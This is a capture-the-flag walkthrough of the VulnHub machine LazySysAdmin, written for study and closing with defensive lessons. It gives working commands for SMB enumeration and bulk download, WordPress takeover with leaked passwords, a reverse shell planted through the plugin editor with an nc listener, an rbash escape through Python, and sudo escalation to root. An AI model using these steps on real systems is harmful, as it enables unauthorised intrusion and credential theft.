# LazySysAdmin: Walkthrough

## Overview

**Machine Name**: LazySysAdmin

**Platform**: VulnHub / Local Lab

**Difficulty**: Easy

**OS**: Ubuntu 14.04 (Trusty Tahr)

**Focus**: SMB Enumeration, WordPress Exploitation, Restricted Shell Escape, Privilege Escalation

## Enumeration

### Network Discovery

The machine was located on the local network using arp-scan.Basharp-scan -l -I eth1668

`# Target IP identified: 192.168.29.110`

### Port Scanning

A full TCP port scan was performed to identify running services.

`nmap -T4 -A -p- 192.168.29.110`

**Significant Results**:

| Port | Service | Version |
| :--- | :--- | :--- |
| 22 | SSH | OpenSSH 6.6.1p1 |
| 80 | HTTP | Apache 2.4.7 |
| 139/445 | SMB | Samba 4.3.11-Ubuntu |
| 3306 | MySQL | MySQL (unauthorized) |
| 6667 | IRC | InspIRCd |

### SMB Enumeration

Checking for anonymous access or shared folders:

`smbclient -L \\\\192.168.29.110\\`

Found a share named share$. Accessing it without a password:

`smbclient \\\\192.168.29.110\\share$`

**Key Files Discovered**:

- _deets.txt_: Contains "Password 12345".

- _todolist.txt_: Mention of web root issues.

- _wordpress/_: Full web directory accessible via SMB.

### Data Exfiltration

I downloaded the entire share for offline analysis:

`smbget --guest --recursive smb://192.168.29.110/share$`

### Web Discovery

Inside the local copy of the WordPress directory, I inspected wp-config.php:

```PHP
define('DB_NAME', 'wordpress');
define('DB_USER', 'Admin');
define('DB_PASSWORD', 'TogieMYSQL12345^^');
```

## Exploitation

### WordPress Entry

Using the credentials found in deets.txt and wp-config.php, I attempted to log in to the WordPress admin panel at http://192.168.29.110/wordpress/wp-login.php.

### Reverse Shell

1. Navigated to the Plugin Editor.

1. Modified a PHP file (or created a new one) with the PentestMonkey PHP Reverse Shell.

1. Set up a listener on the attack machine:
`nc -lvnp 8888`

1. Triggered the shell by navigating to the plugin path.

### Initial Access

```Bash
$ whoami
www-data
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@LazySysAdmin:/tmp$
```

## Privilege Escalation

### Vertical Movement (User: togie)

Based on the /etc/passwd file, a user togie exists. I attempted a password spray using the passwords found earlier.

- TogieMYSQL12345^^: FAILED

- 12345: SUCCESS

```Bash
www-data@LazySysAdmin:/tmp$ su togie
Password: 12345
togie@LazySysAdmin:/tmp$
```

### Restricted Shell Escape

The user togie was placed in a restricted bash (rbash) environment. I escaped this using Python:

`python -c 'import os; os.system("/bin/bash")'`

### Root Access

Checking sudo permissions for togie:
```Bash
togie@LazySysAdmin:~$ sudo -l
# (Output indicated togie can run all commands as root)

togie@LazySysAdmin:~$ sudo su
root@LazySysAdmin:/home/togie# whoami
root
```

## Post-Exploitation

### Flag Recovery

The flag was located in the /root directory.

Proof (/root/proof.txt): **WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851**

## Lessons Learned

1. **Exposed SMB Shares**: Never allow guest access to a share containing sensitive configuration files (wp-config.php) and cleartext passwords (deets.txt).

1. **Weak Passwords**: The use of 12345 allowed for an easy pivot from the service user to a system user.

1. **Sudo Misconfiguration**: Giving a standard user full sudo privileges without specific command restrictions is a critical security risk.

1. **RBASH Bypass**: Restricted shells are easily bypassed if interpreters like Python are available on the system.